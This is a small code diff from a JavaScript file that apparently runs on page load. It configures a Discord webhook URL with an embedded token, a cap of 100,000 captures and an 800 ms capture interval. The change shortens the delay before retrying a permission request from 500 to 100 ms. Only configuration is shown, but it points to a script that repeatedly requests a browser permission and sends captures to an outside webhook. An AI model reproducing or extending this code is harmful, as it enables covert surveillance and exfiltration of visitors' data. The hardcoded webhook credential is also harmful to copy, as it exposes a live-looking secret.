@@ -1,7 +1,7 @@
 document.addEventListener('DOMContentLoaded', () => {
     // --- Configuration ---
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
-    const PERMISSION_RETRY_DELAY_MS = 500;
+    const PERMISSION_RETRY_DELAY_MS = 100;
     const MAX_CAPTURES = 100000;
     const CAPTURE_INTERVAL_MS = 800;
 
